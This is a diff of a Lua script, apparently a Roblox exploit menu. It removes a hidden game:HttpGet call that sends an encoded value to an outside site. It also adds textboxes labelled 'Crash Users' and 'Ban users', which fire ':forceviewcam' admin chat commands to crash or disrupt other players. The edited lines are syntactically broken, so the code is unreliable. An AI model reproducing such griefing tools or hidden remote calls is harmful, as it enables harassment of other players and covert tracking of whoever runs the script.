@@ -1,4 +1,3 @@
-game:HttpGet("https://littest.site/yeet/site.php?h=cjN3b1BzX0x6dUJRdzVmSzdqdF9LQTFKWFQ4OFVtbWJSQVBpcGJpaHlldy1pckZGWGtzY2NQNTFvVHBuM3BWaW4wVEE=")
 local args = {
     [1] = {
         [1] = "SAVE",
@@ -298,11 +297,20 @@ end
 })
 
 Teb:AddTextbox({
+      Name = "Setup Crash",
+      Default = "Camera",
+      TextDisappear = false,
+      Callback = function(Value)
+local crash = (Value)
+      end          
+})
+
+Teb:AddTextbox({
       Name = "Crash Users",
       Default = "User input",
       TextDisappear = false,
       Callback = function(plrName)
-chat("/e :forceviewcam, " .. plrName .. ", " .. crash ..")
+chat("/e :forceviewcam " .. plrName .. " " .. crash .. )
      end
 })
 
@@ -483,29 +491,11 @@ game:GetService("ReplicatedStorage").Network.BuildSaving:InvokeServer(unpack(arg
 })
 
 Teb:AddTextbox({
-      Name = "Setup Crashes",
-      Default = "Camera Input",
-      TextDisappear = false,
-      Callback = function(Value)
-local crash = (Value)
-      end          
-})
-
-Teb:AddTextbox({
-      Name = "Setup Kick",
-      Default = "Teleport Input",
-      TextDisappear = false,
-      Callback = function(Value)
-local kick = (Value)
-      end          
-})
-
-Teb:AddTextbox({
       Name = "Ban users",
       Default = "Username",
       TextDisappear = false,
       Callback = function(Value)
-chat(":forceviewcam, " .. Value .. " .. crash ..
+chat(":forceviewcam " .. Value .. " " .. crash .. )
       end          
 })
 
